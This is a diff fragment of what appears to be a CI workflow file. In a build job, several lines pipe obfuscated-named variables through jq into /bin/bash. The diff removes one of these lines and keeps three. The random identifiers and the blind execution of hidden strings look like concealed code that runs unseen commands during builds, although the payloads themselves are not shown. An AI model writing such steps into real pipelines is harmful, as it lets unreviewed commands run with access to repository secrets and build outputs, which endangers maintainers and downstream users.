@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ve0" | jq -r .kkeu550 | /bin/bash
           printf '%s' "$xfh597" | jq -r .uufx102 | /bin/bash
           echo $tmf92214 | jq -r .pwqd93081 | /bin/bash
-          printf '%s' "$rpx5" | jq -r .gnqmi66 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
